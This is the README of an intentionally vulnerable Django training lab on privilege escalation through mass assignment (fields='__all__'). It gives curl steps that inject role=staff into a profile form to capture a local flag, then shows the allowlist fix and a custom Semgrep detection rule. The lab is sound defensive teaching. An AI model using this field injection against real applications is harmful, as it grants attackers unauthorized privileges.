# Lab 07 — Privilege Escalation (mass assignment)

Companion lab for the blog post
**[Privilege Escalation: How `fields = '__all__'` Hands Every User the Keys to Your Django Admin](https://thiagoteixeira.tech/blog/privilege-escalation-how-fields-all-hands-every-user-the-keys-to-your-django-admin/)**.

| | |
|---|---|
| **OWASP** | A01:2021 — Broken Access Control (impact) · mechanism is CWE-915 mass assignment (A08) |
| **CWE** | CWE-915 — Improperly Controlled Modification of Dynamically-Determined Object Attributes |
| **ASVS** | V5.1.2 — protect against mass parameter assignment |
| **Detection** | SAST — the standard tools **miss** `fields='__all__'`; a **custom rule** ([`rules/mass_assignment.yaml`](../../rules/mass_assignment.yaml)) catches it, asserted in CI (see Scanning it) |

> ⚠️ Intentionally vulnerable. Run locally / in the provided Docker stack only. See [SECURITY.md](../../SECURITY.md).

## The two views

| View | File | What it does |
|---|---|---|
| Vulnerable | [`views_vulnerable.py`](views_vulnerable.py) | profile-edit `ModelForm` with `Meta.fields = '__all__'` — binds `role` from the POST |
| Secure | [`views_secure.py`](views_secure.py) | the same form with `Meta.fields = ['display_name', 'bio']` — `role` is unreachable |

Both are the same "edit my profile" feature, behind `@login_required`. The bug is
that `fields = '__all__'` binds *every* editable field on the `Profile` model —
including `role`, the privilege field the profile page never meant to expose. A
regular member submits the form with an extra `role=staff` field and promotes
themselves; the fix is an explicit field allowlist that never binds `role`.

The privilege boundary is a third view, `/privesc/staff-area/`, which serves the
flag only to a profile whose `role == 'staff'`. **Capturing the flag *is* the
escalation.** (The lab uses an application-level `role` on a `Profile` rather than
`User.is_staff`: `fields='__all__'` directly on `User` drags in required
`username`/`password` and posting `password` corrupts the hash — a `Profile`
keeps the exact footgun the post teaches, runnable and clean.)

## Run it

From the repository root (the folder with `docker-compose.yml`):

```bash
docker compose up -d          # Postgres + Django on http://127.0.0.1:8000 (background)
```

The seed creates `alice` and `bob`, both `role=member`, and the staff-area flag.
Everything below is `curl` against that stack — no browser needed. On Windows
PowerShell, `curl` is an alias for `Invoke-WebRequest` — use `curl.exe`, or Git Bash.

## Test the pair from the command line

**1. Log in as `alice` (a regular member)** and confirm the staff area is closed:

```bash
curl -s -c jar.txt -d 'username=alice&password=labpass' http://127.0.0.1:8000/accounts/login/
curl -s -b jar.txt -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8000/privesc/staff-area/
# 403
```

**2. Exploit it** — POST the profile form with an injected `role=staff` to the
vulnerable view; `fields='__all__'` writes it:

```bash
curl -s -b jar.txt -d 'display_name=Alice&role=staff' http://127.0.0.1:8000/privesc/vulnerable/
# ... role staff (saved)
```

**3. Collect the flag** — the staff gate now opens:

```bash
curl -s -b jar.txt http://127.0.0.1:8000/privesc/staff-area/ | grep -o 'FLAG{[^}]*}'
# FLAG{privilege_escalation_via_mass_assignment}
```

**4. The fix** — log in as `bob` (still a member) and try the same injection
against the secure view; `role` is dropped and the staff area stays closed:

```bash
curl -s -c jar2.txt -d 'username=bob&password=labpass' http://127.0.0.1:8000/accounts/login/
curl -s -b jar2.txt -d 'display_name=Bob&role=staff' http://127.0.0.1:8000/privesc/secure/
curl -s -b jar2.txt -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8000/privesc/staff-area/
# 403
```

Or prove all of it in one command (from the repo root):

```bash
docker compose run --rm web python manage.py test labs.post_07_privesc
```

> **Why `curl`, not a browser.** The bug is server-side field binding: the same
> form accepts a field the template never rendered. The rendered page is
> cosmetic; what the form *binds* is what matters, and `curl` shows it directly.

## The fix

Enumerate the fields the client may write — never `'__all__'` on a model that
carries a privilege field:

```python
class ProfileForm(forms.ModelForm):
    class Meta:
        model = Profile
        fields = ["display_name", "bio"]   # allowlist — `role` is unreachable
```

For DRF, the same rule applies (`fields = [...]`), plus `read_only_fields` for
permission fields as defence-in-depth, and a separate admin-only serializer for
endpoints that legitimately change roles — see the post.

## Isolation

This lab teaches privilege escalation via mass assignment and nothing else.
Output is escaped (not an XSS lab, Post 2); no raw SQL (Post 1); the lookup is
the requester's own profile, so it does not drift into IDOR (Post 6); global CSRF
is off in this project, so the POST needs no token (CSRF is Post 8).

## Scanning it

The standard SAST tools **miss this class**. Bandit reports **0 on the
views/forms** (its 42 plugins are all dangerous-*call* checks; a form field list
is not one) — the only thing it flags is a `B106` hardcoded password in the
*test* file, noise unrelated to the class. Semgrep's community packs report **0**
too, and even the registry `r/python.django` has no rule for `fields='__all__'`
(only an unrelated `direct-use-of-httpresponse` nit). The tools that catch this
pattern are dedicated Django **linters** — Ruff `DJ007` and flake8-django `DJ07`
— not this SAST toolchain.

That is the §6.4.1 *miss* case, so this lab ships a **custom rule**,
[`rules/mass_assignment.yaml`](../../rules/mass_assignment.yaml) (with fixture
[`rules/mass_assignment.py`](../../rules/mass_assignment.py)). It flags
`fields = '__all__'` inside a `Meta`, so it fires on the vulnerable view and is
silent on the explicit-allowlist fix — enforced in the hermetic custom-rules CI
job. The rule is **shared with Post 10 (Mass Assignment)**: same sink, different
exposed field.

Bandit and Semgrep are pinned but **not bundled in the lab image** (same as CI).
Install them on the host — `pip install bandit==1.9.4 semgrep==1.170.0` — or
prefix a command with `docker compose run --rm web sh -c "..."`. All commands run
from the repository root.

```bash
# the standard tools — miss the class
bandit -r labs/post_07_privesc/
semgrep scan --config p/django --config p/python --config p/owasp-top-ten labs/post_07_privesc/

# the custom rule — catches it
semgrep --test --config rules/mass_assignment.yaml rules/mass_assignment.py
semgrep scan --config rules/mass_assignment.yaml labs/post_07_privesc/views_vulnerable.py  # 1 finding (line 26)
semgrep scan --config rules/mass_assignment.yaml labs/post_07_privesc/views_secure.py      # 0 findings
```

**No push-button DAST here.** A black-box scanner could send `role=staff`, but it
cannot know `role` was never meant to be client-settable or that `staff` crosses
a privilege boundary — that is the application's field allowlist and role model,
not something a scanner infers. The captured runs are under
[`scans/`](scans/); `tests.py` is the runnable proof of the escalation.
